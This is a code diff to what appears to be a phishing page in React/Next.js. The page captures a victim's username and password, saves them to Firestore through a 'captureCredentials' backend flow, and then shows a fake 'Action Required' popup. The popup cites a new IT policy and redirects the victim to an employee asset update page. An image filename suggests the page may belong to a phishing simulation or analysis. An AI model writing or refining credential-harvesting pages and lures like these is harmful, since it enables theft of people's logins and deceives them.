@@ -2,6 +2,9 @@
 import { FormEvent, useState } from 'react';
 import { captureCredentials } from '@/ai/flows/capture-credentials';
 
+// Define Swal type for TypeScript
+declare const Swal: any;
+
 export default function Home() {
   const imageUrl = "https://storage.googleapis.com/fsm-build-artefacts/PhishingSampleAnalysis10June-1.jpg";
 
@@ -18,16 +21,32 @@ export default function Home() {
     try {
       // Capture credentials on the backend (saves to Firestore)
       await captureCredentials({ username, password });
-      
-      // Redirect to the page that shows the popup
-      window.location.href = '/action-required.html';
+
+      // Directly trigger the SweetAlert2 popup after saving credentials
+      if (typeof Swal !== 'undefined') {
+        Swal.fire({
+          title: "Action Required: Employee Asset Details",
+          text: "Please review and update your asset information in accordance with the new IT policy.",
+          icon: "info",
+          confirmButtonText: "Update Now",
+          confirmButtonColor: "#3085d6",
+          background: "#fff",
+          color: "#333"
+        }).then(() => {
+          // Redirect to the asset update page after pressing the button
+          window.location.href = "/employee-asset-update"; 
+        });
+      } else {
+        // Fallback if Swal is not loaded
+        alert("Action Required: Please review and update your asset information.");
+        window.location.href = "/employee-asset-update";
+      }
 
     } catch (error) {
       console.error("An error occurred during submission:", error);
       // If there's an error, re-enable the form
       setIsSubmitting(false);
     }
-    // No finally block needed as we are redirecting on success.
   };
   
   return (
